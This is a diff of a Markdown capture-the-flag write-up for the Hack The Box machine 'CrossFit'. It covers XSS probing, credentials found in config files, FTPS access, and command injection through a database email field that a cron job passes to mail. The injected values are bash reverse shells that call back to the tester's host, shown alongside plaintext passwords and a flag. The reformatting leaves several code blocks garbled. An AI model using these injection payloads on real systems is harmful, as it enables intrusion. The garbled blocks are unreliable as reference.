@@ -1,31 +1,32 @@
-# HTB - CrossFit
+# HTB - Crossfit
 
-## Overview
+## HTB - CrossFit
 
-![](<machine>.infocard.png)
+### Overview
+
+![](https://github.com/zweilosec/htb-writeups/tree/0977bb3331e6a624d74da23acc231dfcc32c74ad/linux-machines/insane/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
-## Useful Skills and Tools
+### Useful Skills and Tools
 
-#### Useful thing 1
+**Useful thing 1**
 
-- description with generic example
+* description with generic example
 
-#### Useful thing 2
+**Useful thing 2**
 
-- description with generic example
+* description with generic example
 
-## Enumeration
+### Enumeration
 
-### Nmap scan
-
+#### Nmap scan
 
 I started my enumeration with an nmap scan of `10.10.10.208`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
-All this time I did not know that there were more levels of verbosity, I had just been using -v to get information as it was discovered instead of waiting for the scan to finish.  I will be using -vvv from now on!
+All this time I did not know that there were more levels of verbosity, I had just been using -v to get information as it was discovered instead of waiting for the scan to finish. I will be using -vvv from now on!
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ nmap -sCV -n -p- -Pn -vvv 10.10.10.208                                                          1 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
@@ -132,17 +133,17 @@ Nmap done: 1 IP address (1 host up) scanned in 47.99 seconds
 
 There were only three ports open, 21 - FTP, 22 - SSH, and 80 - HTTP.
 
-### FTP 
+#### FTP
 
-```
+```text
 21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
 | ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US/emailAddress=info@gym-club.crossfit.htb
 | Issuer: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US/emailAddress=info@gym-club.crossfit.htb
 ```
 
-Found hostname `crossfit.htb` and `gym-club.crossfit.htb` which I added to my `/etc/hosts/` file. 
+Found hostname `crossfit.htb` and `gym-club.crossfit.htb` which I added to my `/etc/hosts/` file.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ ftp crossfit.htb
 Connected to crossfit.htb.
@@ -158,11 +159,11 @@ I was not able to log in to FTP using anonymous
 
 `crossfit.htb` only led to the default apache page, but `gym-club.crossfit.htb` led to
 
-as in HTB - Forwardslash 
+as in HTB - Forwardslash
 
 `gobuster vhost -u http://crossfit.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ gobuster vhost -u http://crossfit.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 ===============================================================
@@ -186,15 +187,15 @@ Did not find any more subdomains
 
 Found four possible usernames on the About-Us page: Becky Taylor - Gymer, Noah Leonard - Trainer, Evelyn Fields - Gymer, Leroy Guzman - Manager
 
-Since there wasn't anything obvious to go by, I started poking at the submission boxes.  The first one at [`/contact`?] did not seem to be vulnerable to either XSS or SQL injection, however the second one at `/blog-single.php` gave a warning about XSS.
+Since there wasn't anything obvious to go by, I started poking at the submission boxes. The first one at \[`/contact`?\] did not seem to be vulnerable to either XSS or SQL injection, however the second one at `/blog-single.php` gave a warning about XSS.
 
-```html
+```markup
 XSS attempt detected</h4><hr>A security report containing your IP address and browser information will be generated and our admin team will be immediately notified.
 ```
 
-Browser information will be sent to the admin?  Maybe I could smuggle something that would be executed through the browser information - AKA User-Agent
+Browser information will be sent to the admin? Maybe I could smuggle something that would be executed through the browser information - AKA User-Agent
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ nc -lvnp 8090                       
 listening on [any] 8090 ...
@@ -211,7 +212,7 @@ Connection: keep-alive
 
 I recieved an http get request back to my waiting nc listener
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ python3 -m http.server 8099
 Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
@@ -220,7 +221,7 @@ Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
 
 In the same spirit I tried to get the admin to download a php shell from me but it didnt get executed, and I couldn't find where it had been possibly uploaded
 
-```
+```text
 www-data@crossfit:/var/www/ftp/database/factories$ ls -la
 total 12
 drwxr-xr-x 2 root root 4096 May  1  2020 .
@@ -231,7 +232,7 @@ www-data@crossfit:/var/www/ftp/database/factories$ vi UserFactory.php
 
 database
 
-```
+```text
 <?php
 
 /** @var \Illuminate\Database\Eloquent\Factory $factory */
@@ -264,11 +265,9 @@ $factory->define(User::class, function (Faker $faker) {
 
 /var/www/ftp/database/factories
 
+### Initial Foothold
 
-
-## Initial Foothold
-
-```
+```text
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -306,13 +305,13 @@ hank:x:1004:1006::/home/hank:/bin/bash
 
 root, isaac, and hank can login
 
-## Road to User
+### Road to User
 
-### Further enumeration
+#### Further enumeration
 
-### Finding user creds
+#### Finding user creds
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ ssh hank@10.10.10.208                                                                           1 ⨯
 The authenticity of host '10.10.10.208 (10.10.10.208)' can't be established.
@@ -349,27 +348,27 @@ hank@crossfit:~$ cat user.txt
 9e326def2df97f2b7ac41362a8d8f446
 ```
 
-### User.txt
+#### User.txt
 
-## Path to Power \(Gaining Administrator Access\)
+### Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as 'hank'
+#### Enumeration as 'hank'
 
-```
+```text
 hank@crossfit:~$ id
 uid=1004(hank) gid=1006(hank) groups=1006(hank),1005(admins)
 ```
 
 `hank` is in the group `admins` which sounds interesting
 
-```
+```text
 hank@crossfit:~$ sudo -l
 -bash: sudo: command not found
 ```
 
 odd... I checked /usr/sbin and there was no binary for it
 
-```
+```text
 hank@crossfit:~$ ifconfig
 -bash: ifconfig: command not found
 hank@crossfit:~$ ip a
@@ -391,16 +390,14 @@ hank@crossfit:~$ ip a
 
 ifconfig was also missing
 
-```
+```text
 hank@crossfit:~$ uname -a
 Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 ```
 
 This is a debian-based system
 
-
-
-```
+```text
 hank@crossfit:/dev/shm$ ps aux > ps
 hank@crossfit:/dev/shm$ ls
 ps
@@ -419,11 +416,11 @@ hank      8638  0.0  0.0  10632  3112 pts/0    R+   11:07   0:00 ps aux
 
 selenium? also...cant see any processes from other users
 
-https://www.selenium.dev/
+[https://www.selenium.dev/](https://www.selenium.dev/)
 
 > Selenium automates browsers. That's it!
 
-```
+```text
 hank@crossfit:/var$ cd www/
 hank@crossfit:/var/www$ ls
 development-test  ftp  gym-club  html
@@ -449,338 +446,230 @@ $conn = new mysqli($dbhost, $dbuser, $dbpass, $db);
 ?>
 ```
 
-in the /var/www/gym-club/ directory there was a file db.php.  This password did not work to switch users to isaac or root
+in the /var/www/gym-club/ directory there was a file db.php. This password did not work to switch users to isaac or root
 
-```clean this up
-hank@crossfit:/var/www/gym-club$ mysql -u crossfit -p -D crossfit
-Enter password: 
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
+\`\`\`clean this up hank@crossfit:/var/www/gym-club$ mysql -u crossfit -p -D crossfit Enter password: Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A
 
-Welcome to the MariaDB monitor.  Commands end with ; or \g.
-Your MariaDB connection id is 9552
-Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10
+Welcome to the MariaDB monitor. Commands end with ; or \g. Your MariaDB connection id is 9552 Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10
 
-Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+Copyright \(c\) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
 
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
-MariaDB [crossfit]> show tables
-    -> ;
-+--------------------+
-| Tables_in_crossfit |
-+--------------------+
-| messages           |
-| roles              |
-| security_report    |
-| trainers           |
-| users              |
-+--------------------+
-5 rows in set (0.000 sec)
+MariaDB \[crossfit\]&gt; show tables -&gt; ; +--------------------+ \| Tables\_in\_crossfit \| +--------------------+ \| messages \| \| roles \| \| security\_report \| \| trainers \| \| users \| +--------------------+ 5 rows in set \(0.000 sec\)
 
-MariaDB [crossfit]> Select * from users
-    -> ;
-Empty set (0.000 sec)
+MariaDB \[crossfit\]&gt; Select \* from users -&gt; ; Empty set \(0.000 sec\)
 
-MariaDB [crossfit]> select * from trainers;
-+----+------------+-----------+---------------+------+
-| id | first_name | last_name | pic           | role |
-+----+------------+-----------+---------------+------+
-|  1 | Becky      | Taylor    | trainer-1.jpg |    1 |
-|  2 | Noah       | Leonard   | trainer-2.jpg |    2 |
-|  3 | Evelyn     | Fields    | trainer-3.jpg |    1 |
-|  4 | Leroy      | Guzman    | trainer-4.jpg |    3 |
-+----+------------+-----------+---------------+------+
-4 rows in set (0.000 sec)
+MariaDB \[crossfit\]&gt; select \* from trainers; +----+------------+-----------+---------------+------+ \| id \| first\_name \| last\_name \| pic \| role \| +----+------------+-----------+---------------+------+ \| 1 \| Becky \| Taylor \| trainer-1.jpg \| 1 \| \| 2 \| Noah \| Leonard \| trainer-2.jpg \| 2 \| \| 3 \| Evelyn \| Fields \| trainer-3.jpg \| 1 \| \| 4 \| Leroy \| Guzman \| trainer-4.jpg \| 3 \| +----+------------+-----------+---------------+------+ 4 rows in set \(0.000 sec\)
 
-MariaDB [crossfit]> show * from security_report;
-ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '* from security_report' at line 1
-MariaDB [crossfit]> show * from roles;
-ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '* from roles' at line 1
-MariaDB [crossfit]> select * from security_report;
-Empty set (0.000 sec)
+MariaDB \[crossfit\]&gt; show  _from security\_report; ERROR 1064 \(42000\): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '_ from security\_report' at line 1 MariaDB \[crossfit\]&gt; show  _from roles; ERROR 1064 \(42000\): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '_ from roles' at line 1 MariaDB \[crossfit\]&gt; select \* from security\_report; Empty set \(0.000 sec\)
 
-MariaDB [crossfit]> select * from roles;
-+----+---------+
-| id | name    |
-+----+---------+
-|  1 | Gymer   |
-|  2 | Trainer |
-|  3 | Manager |
-+----+---------+
-3 rows in set (0.000 sec)
+MariaDB \[crossfit\]&gt; select \* from roles; +----+---------+ \| id \| name \| +----+---------+ \| 1 \| Gymer \| \| 2 \| Trainer \| \| 3 \| Manager \| +----+---------+ 3 rows in set \(0.000 sec\)
 
-MariaDB [crossfit]> select * from message
-message           messages.email    messages.message  
-messages          messages.id       messages.name     
-MariaDB [crossfit]> select * from messages;
-Empty set (0.001 sec)
+MariaDB \[crossfit\]&gt; select  _from message message messages.email messages.message  
+messages messages.id messages.name  
+MariaDB \[crossfit\]&gt; select_  from messages; Empty set \(0.001 sec\)
 
-MariaDB [crossfit]> select email,id,name,message from messages;
-Empty set (0.000 sec)
+MariaDB \[crossfit\]&gt; select email,id,name,message from messages; Empty set \(0.000 sec\)
 
-MariaDB [crossfit]> show database;
-ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'database' at line 1
-MariaDB [crossfit]> show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| crossfit           |
-| information_schema |
-+--------------------+
-2 rows in set (0.001 sec)
+MariaDB \[crossfit\]&gt; show database; ERROR 1064 \(42000\): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'database' at line 1 MariaDB \[crossfit\]&gt; show databases; +--------------------+ \| Database \| +--------------------+ \| crossfit \| \| information\_schema \| +--------------------+ 2 rows in set \(0.001 sec\)
 
-MariaDB [crossfit]> use information_schema ;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
+MariaDB \[crossfit\]&gt; use information\_schema ; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A
 
-Database changed
-MariaDB [information_schema]> show tables;
-+---------------------------------------+
-| Tables_in_information_schema          |
-+---------------------------------------+
----snipped---
-```
+Database changed MariaDB \[information\_schema\]&gt; show tables; +---------------------------------------+ \| Tables\_in\_information\_schema \| +---------------------------------------+ ---snipped---
 
+```text
 I used the credentials to log into the database, but there was no useful information there.  It only held information that was displayed on the website
-
-```
-<?php
-  if($_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
-  {
-    echo "Your are not allowed to access this page.";
-    return;
-  }
-?>
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Security Report</title>
-  <style>
-    table, th, td {
-      border: 1px solid black;
-    }
-  </style>
-</head>
-<body>
-<h4>Logged XSS attempts</h4>
-<table>
-  <thead>
-    <tr>
-      <td>Timestamp</td>
-      <td>User Agent</td>
-      <td>IP Address</td>
-    </tr>
-  </thead>
-<tbody>
-<?php
-$host = "localhost";
-$user = "crossfit";
-$pass = "oeLoo~y2baeni";
-$db = "crossfit";
-$conn = new mysqli($host, $user, $pass, $db);
-if($conn)
-{
-    $res = $conn->query('SELECT * FROM security_report LIMIT 1');
-    while($row = $res->fetch_array(MYSQLI_ASSOC))
-    {
-        echo "<tr>";
-        echo "<td>" . $row['timestamp'] . "</td>";
-        echo "<td>" . $row['ua'] . "</td>";
-        echo "<td>" . long2ip($row['ip']) . "</td>";
-        echo "</tr>";
-        $conn->query('DELETE FROM security_report WHERE id='.$row['id']);
-    }
-}
-?>
-</tbody>
-</body>
-</html>
 ```
 
+&lt;?php if\($\_SERVER\['REMOTE\_ADDR'\] !== '127.0.0.1'\) { echo "Your are not allowed to access this page."; return; } ?&gt; &lt;!DOCTYPE html&gt;
+
+Security Report table, th, td { border: 1px solid black; } 
+
+Logged XSS attempts
+
+ query\('SELECT \* FROM security\_report LIMIT 1'\); while\($row = $res-&gt;fetch\_array\(MYSQLI\_ASSOC\)\) { echo " &lt;/body&gt; &lt;/html&gt;
+
+```text
 In the security_threat folder there was a reports.php that held the code for reporting the detected xss events
-
-
-```
-hank@crossfit:/home/isaac/send_updates$ find / -group admins 2>/dev/null
-/home/isaac/send_updates
-/home/isaac/send_updates/composer.lock
-/home/isaac/send_updates/send_updates.php
-/home/isaac/send_updates/composer.json
-/etc/pam.d/chfn
-/etc/pam.d/newusers
-/etc/pam.d/vmtoolsd
-/etc/pam.d/common-auth
-/etc/pam.d/login
-/etc/pam.d/systemd-user
-/etc/pam.d/runuser-l
-/etc/pam.d/common-account
-/etc/pam.d/vsftpd.orig
-/etc/pam.d/su
-/etc/pam.d/vsftpd
-/etc/pam.d/su-l
-/etc/pam.d/chpasswd
-/etc/pam.d/common-password
-/etc/pam.d/common-session-noninteractive
-/etc/pam.d/sshd
-/etc/pam.d/common-session
-/etc/pam.d/other
-/etc/pam.d/chsh
-/etc/pam.d/passwd
-/etc/pam.d/cron
-/etc/pam.d/runuser
 ```
 
+hank@crossfit:/home/isaac/send\_updates$ find / -group admins 2&gt;/dev/null /home/isaac/send\_updates /home/isaac/send\_updates/composer.lock /home/isaac/send\_updates/send\_updates.php /home/isaac/send\_updates/composer.json /etc/pam.d/chfn /etc/pam.d/newusers /etc/pam.d/vmtoolsd /etc/pam.d/common-auth /etc/pam.d/login /etc/pam.d/systemd-user /etc/pam.d/runuser-l /etc/pam.d/common-account /etc/pam.d/vsftpd.orig /etc/pam.d/su /etc/pam.d/vsftpd /etc/pam.d/su-l /etc/pam.d/chpasswd /etc/pam.d/common-password /etc/pam.d/common-session-noninteractive /etc/pam.d/sshd /etc/pam.d/common-session /etc/pam.d/other /etc/pam.d/chsh /etc/pam.d/passwd /etc/pam.d/cron /etc/pam.d/runuser
+
+```text
 I searched for files that `hank` could access as a member of the `admins` group, and found a bunch of them in the /etc/pam.d folder
-
-```
-auth sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3
-account sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3
-
-# Standard behaviour for ftpd(8).
-auth    required        pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed
-
-# Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.
-
-# Standard pam includes
-@include common-account
-@include common-session
-@include common-auth
-auth    required        pam_shells.so
 ```
 
+auth sufficient pam\_mysql.so user=ftpadm passwd=8W\)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3 account sufficient pam\_mysql.so user=ftpadm passwd=8W\)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3
+
+## Standard behaviour for ftpd\(8\).
+
+auth required pam\_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed
+
+## Note: vsftpd handles anonymous logins on its own. Do not enable pam\_ftp.so.
+
+## Standard pam includes
+
+@include common-account @include common-session @include common-auth auth required pam\_shells.so
+
+```text
 In /etc/pam.d the file vsftpd contained the password for `ftpadm`
-
 ```
-# Set this to 'yes' to enable PAM authentication, account processing,
-# and session processing. If this is enabled, PAM authentication will
-# be allowed through the ChallengeResponseAuthentication and
-# PasswordAuthentication.  Depending on your PAM configuration,
-# PAM authentication via ChallengeResponseAuthentication may bypass
-# the setting of "PermitRootLogin without-password".
-# If you just want the PAM account and session checks to run without
-# PAM authentication, then enable this but set PasswordAuthentication
-# and ChallengeResponseAuthentication to 'no'.
+
+## Set this to 'yes' to enable PAM authentication, account processing,
+
+## and session processing. If this is enabled, PAM authentication will
+
+## be allowed through the ChallengeResponseAuthentication and
+
+## PasswordAuthentication.  Depending on your PAM configuration,
+
+## PAM authentication via ChallengeResponseAuthentication may bypass
+
+## the setting of "PermitRootLogin without-password".
+
+## If you just want the PAM account and session checks to run without
+
+## PAM authentication, then enable this but set PasswordAuthentication
+
+## and ChallengeResponseAuthentication to 'no'.
+
 UsePAM yes
 
-#AllowAgentForwarding yes
-#AllowTcpForwarding yes
-#GatewayPorts no
+## AllowAgentForwarding yes
+
+## AllowTcpForwarding yes
+
+## GatewayPorts no
+
 X11Forwarding yes
-#X11DisplayOffset 10
-#X11UseLocalhost yes
-#PermitTTY yes
+
+## X11DisplayOffset 10
+
+## X11UseLocalhost yes
+
+## PermitTTY yes
+
 PrintMotd no
-#PrintLastLog yes
-#TCPKeepAlive yes
-#PermitUserEnvironment no
-#Compression delayed
-#ClientAliveInterval 0
-#ClientAliveCountMax 3
-#UseDNS no
-#PidFile /var/run/sshd.pid
-#MaxStartups 10:30:100
-#PermitTunnel no
-#ChrootDirectory none
-#VersionAddendum none
 
-# no default banner path
-#Banner none
+## PrintLastLog yes
 
-# Allow client to pass locale environment variables
-AcceptEnv LANG LC_*
+## TCPKeepAlive yes
 
-# override default of no subsystems
-Subsystem       sftp    /usr/lib/openssh/sftp-server
+## PermitUserEnvironment no
 
-# Example of overriding settings on a per-user basis
-#Match User anoncvs
-#       X11Forwarding no
-#       AllowTcpForwarding no
-#       PermitTTY no
-#       ForceCommand cvs server
+## Compression delayed
+
+## ClientAliveInterval 0
+
+## ClientAliveCountMax 3
+
+## UseDNS no
+
+## PidFile /var/run/sshd.pid
+
+## MaxStartups 10:30:100
+
+## PermitTunnel no
+
+## ChrootDirectory none
+
+## VersionAddendum none
+
+## no default banner path
+
+## Banner none
+
+## Allow client to pass locale environment variables
+
+AcceptEnv LANG LC\_\*
+
+## override default of no subsystems
+
+Subsystem sftp /usr/lib/openssh/sftp-server
+
+## Example of overriding settings on a per-user basis
+
+## Match User anoncvs
+
+## X11Forwarding no
+
+## AllowTcpForwarding no
+
+## PermitTTY no
+
+## ForceCommand cvs server
+
 DenyUsers ftpadm
-```
 
+```text
 Unfortunately the ssh configuration was set to explicitely deny `ftpadm` from logging in through ssh
-
-```
-┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ ftp 10.10.10.208
-Connected to 10.10.10.208.
-220 Cross Fit Ltd. FTP Server
-Name (10.10.10.208:zweilos): ftpadm
-530 Non-anonymous sessions must use encryption.
-Login failed.
-421 Service not available, remote server has closed connection
 ```
 
+┌──\(zweilos㉿kali\)-\[~/htb/crossfit\] └─$ ftp 10.10.10.208 Connected to 10.10.10.208. 220 Cross Fit Ltd. FTP Server Name \(10.10.10.208:zweilos\): ftpadm 530 Non-anonymous sessions must use encryption. Login failed. 421 Service not available, remote server has closed connection
+
+```text
 I tried to login to ftp using these credentials, but got an error stating that I needed to use encryption for non-anonymous sessions.  I can't use SFTP since SSH is denied for this user, so I must need to use FTPS
 
 https://superuser.com/questions/623236/simple-command-to-connect-to-ftps-server-on-linux-command-line
 
 This post on stack overflow shows how to connect using `lftp`
-
-```
-┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ lftp -u ftpadm 10.10.10.208
-Password: 
-lftp ftpadm@10.10.10.208:~> ls                   
-ls: Fatal error: Certificate verification: Not trusted (25:EC:D2:FE:6C:9D:77:04:EC:7D:D7:92:87:67:4B:C3:8D:0E:CB:CE)
-lftp ftpadm@10.10.10.208:~> 
-exit
 ```
 
+┌──\(zweilos㉿kali\)-\[~/htb/crossfit\] └─$ lftp -u ftpadm 10.10.10.208 Password: lftp ftpadm@10.10.10.208:~&gt; ls  
+ls: Fatal error: Certificate verification: Not trusted \(25:EC:D2:FE:6C:9D:77:04:EC:7D:D7:92:87:67:4B:C3:8D:0E:CB:CE\) lftp ftpadm@10.10.10.208:~&gt; exit
+
+```text
 https://serverfault.com/questions/411970/how-to-avoid-lftp-certificate-verification-error
-
-```
-┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ lftp -u ftpadm 10.10.10.208 -e "set ftp:ssl-allow no" 
-Password: 
-lftp ftpadm@10.10.10.208:~> ls                   
-ls: Login failed: 530 Non-anonymous sessions must use encryption.
-lftp ftpadm@10.10.10.208:~> 
-exit
 ```
 
+┌──\(zweilos㉿kali\)-\[~/htb/crossfit\] └─$ lftp -u ftpadm 10.10.10.208 -e "set ftp:ssl-allow no" Password: lftp ftpadm@10.10.10.208:~&gt; ls  
+ls: Login failed: 530 Non-anonymous sessions must use encryption. lftp ftpadm@10.10.10.208:~&gt; exit
+
+```text
 So that parameter disabled encrytpion completely...
-
-```
-┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ lftp -u ftpadm 10.10.10.208 -e "set ssl:verify-certificate no"                                  1 ⨯
-Password: 
-lftp ftpadm@10.10.10.208:~> ls                   
-drwxrwx---    2 1003     116          4096 Sep 21 10:19 messages
 ```
 
+┌──\(zweilos㉿kali\)-\[~/htb/crossfit\] └─$ lftp -u ftpadm 10.10.10.208 -e "set ssl:verify-certificate no" 1 ⨯ Password: lftp ftpadm@10.10.10.208:~&gt; ls  
+drwxrwx--- 2 1003 116 4096 Sep 21 10:19 messages
+
+```text
 Using the parameter `set ssl:verify-certificate no` got rid of the warning and allowed me to log in.  There was only one folder `messages`, which I had read-write access to, but it was empty.  Once again I uploaded a reverse shell and executed it, but I wasnt sure where the folder was
-
 ```
-# /etc/crontab: system-wide crontab
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
 
-MAILTO=""
-SHELL=/bin/sh
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+## /etc/crontab: system-wide crontab
 
-# Example of job definition:
-# .---------------- minute (0 - 59)
-# |  .------------- hour (0 - 23)
-# |  |  .---------- day of month (1 - 31)
-# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
-# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
-# |  |  |  |  |
-# *  *  *  *  * user-name command to be executed
-17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
-25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
-47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
-52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-*  *    * * *   isaac   /usr/bin/php /home/isaac/send_updates/send_updates.php
-#
-```
+## Unlike any other crontab you don't have to run the \`crontab'
+
+## command to install the new version when you edit this file
+
+## and files in /etc/cron.d. These files also have username fields,
+
+## that none of the other crontabs do.
+
+MAILTO="" SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+## Example of job definition:
+
+## .---------------- minute \(0 - 59\)
+
+## \|  .------------- hour \(0 - 23\)
+
+## \|  \|  .---------- day of month \(1 - 31\)
+
+## \|  \|  \|  .------- month \(1 - 12\) OR jan,feb,mar,apr ...
+
+## \|  \|  \|  \|  .---- day of week \(0 - 6\) \(Sunday=0 or 7\) OR sun,mon,tue,wed,thu,fri,sat
+
+## \|  \|  \|  \|  \|
+
+##     __  \* user-name command to be executed
+
+17  __  __ root cd / && run-parts --report /etc/cron.hourly 25 6  __  _root test -x /usr/sbin/anacron \|\| \( cd / && run-parts --report /etc/cron.daily \) 47 6_   _7 root test -x /usr/sbin/anacron \|\| \( cd / && run-parts --report /etc/cron.weekly \) 52 6 1_  \* root test -x /usr/sbin/anacron \|\| \( cd / && run-parts --report /etc/cron.monthly \)
+
+* * * * * isaac   /usr/bin/php /home/isaac/send\_updates/send\_updates.php
+
+          \`\`\`
 
 In /etc/crontab there was a cron running every minute as the user `isaac`. This cron ran the script `send_updates.php` from /home/issac/
 
@@ -824,13 +713,13 @@ cleanup();
 ?>
 ```
 
-In the folder /home/isaac/send_updates there was a php file.  Reading through the code, it seemed as if it was created to email the Crossfit Club Newsletter automatically to all users in the database.  The `mail` command was being run by the `mikehaertl\shellcommand\Command` library, which after a short search I found on github.
+In the folder /home/isaac/send\_updates there was a php file. Reading through the code, it seemed as if it was created to email the Crossfit Club Newsletter automatically to all users in the database. The `mail` command was being run by the `mikehaertl\shellcommand\Command` library, which after a short search I found on github.
 
-https://github.com/mikehaertl/php-shellcommand
+[https://github.com/mikehaertl/php-shellcommand](https://github.com/mikehaertl/php-shellcommand)
 
 > php-shellcommand provides a simple object oriented interface to execute shell commands.
 
-```
+```text
 {
     "require": {
         "mikehaertl/php-shellcommand": "1.6.0"
@@ -840,11 +729,11 @@ https://github.com/mikehaertl/php-shellcommand
 
 composer.json shows the version of this library is 1.6.0
 
-https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426
+[https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426](https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426)
 
-Since this executes arbitrary commands, and there is no kind of filtering being done on the `email` parameter, this could be used to inject other commands.  
+Since this executes arbitrary commands, and there is no kind of filtering being done on the `email` parameter, this could be used to inject other commands.
 
-```
+```text
 hank@crossfit:/home/isaac/send_updates$ mail --help
 Usage: mail [OPTION...] [address...]
   or:  mail [OPTION...] [OPTION...] [file]
@@ -913,9 +802,9 @@ GNU Mailutils home page: <http://mailutils.org>
 General help using GNU software: <http://www.gnu.org/gethelp/>
 ```
 
-Looking at the `mail` program's help, I noticed that there was a flag `-E` that allowed to execution of commands.  Since I already had the credentials to the database, it seemed likely that I could create an entry in the user's table that contained code I wanted to execute as `isaac` in the email field.  `isaac` did not have a .ssh folder to insert my public key to, so I needed to craft a reverse shell
+Looking at the `mail` program's help, I noticed that there was a flag `-E` that allowed to execution of commands. Since I already had the credentials to the database, it seemed likely that I could create an entry in the user's table that contained code I wanted to execute as `isaac` in the email field. `isaac` did not have a .ssh folder to insert my public key to, so I needed to craft a reverse shell
 
-```
+```text
 hank@crossfit:/home/isaac$ mysql -u crossfit -p -D crossfit
 Enter password: 
 Reading table information for completion of table and column names
@@ -952,7 +841,7 @@ MariaDB [crossfit]> select * from users;
 
 ghik
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ nc -lvnp 8099
 listening on [any] 8099 ...
@@ -963,9 +852,9 @@ isaac@crossfit:~$ test
 isaac@crossfit:~$ exit
 ```
 
-I got a connection back from my injected code, however it also immediately ran two commands (test and exit) which caused it to disconnect...I could not get the same injected command to work later.  I have not idea what is broken here
+I got a connection back from my injected code, however it also immediately ran two commands \(test and exit\) which caused it to disconnect...I could not get the same injected command to work later. I have not idea what is broken here
 
-```
+```text
 MariaDB [crossfit]> INSERT INTO users (id,email) VALUES (8081,"-E $(bash -c 'bash -i >& /dev/tcp/10.10.14.176/8081 0>&1')");
 Query OK, 1 row affected (0.001 sec)
 
@@ -980,15 +869,14 @@ MariaDB [crossfit]> select * from users;
 
 This worked
 
-```
+```text
 MariaDB [crossfit]> INSERT INTO users (email) VALUES ("test & bash -c 'bash -i >& /dev/tcp/10.10.14.176/10001 0>&1'");
 Query OK, 1 row affected (0.001 sec)
 ```
 
 This also worked
 
-
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ lftp -u ftpadm 10.10.10.208 -e "set ssl:verify-certificate no" 
 Password: 
